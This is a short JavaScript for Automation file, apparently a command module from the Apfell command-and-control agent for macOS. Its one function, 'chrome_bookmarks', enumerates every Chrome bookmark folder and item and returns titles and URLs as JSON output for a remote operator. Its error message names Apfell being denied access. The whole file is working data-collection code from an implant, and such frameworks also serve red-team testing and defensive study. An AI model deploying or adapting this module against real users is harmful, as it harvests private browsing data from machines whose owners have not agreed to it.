exports.chrome_bookmarks = function(task, command, params){
	let all_data = [];
	try{
		let ch = Application("Google Chrome");
		if(ch.running()){
            var folders = ch.bookmarkFolders;
            for (let i = 0; i < folders.length; i ++){
                var folder = folders[i];
                var bookmarks = folder.bookmarkItems;
                all_data.push("Folder Name: " + folder.title());
                for (let j = 0; j < bookmarks.length; j++){
                    var info = "Title: " + bookmarks[j].title() +
                    "\nURL: " + bookmarks[j].url() +
                    "\nindex: " + bookmarks[j].index() +
                    "\nFolder/bookmark: " + i + "/" + j;
                    all_data.push(info); //populate our array
                }
            }
        }
        else{
            return JSON.stringify({"user_output": "Chrome is not running", "completed": true, "status": "error"});
        }
	}catch(error){
		let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return JSON.stringify({"user_output":err, "completed": true, "status": "error"});
	}
	return JSON.stringify({"user_output": all_data, "completed": true});
};
COMMAND_ENDS_HERE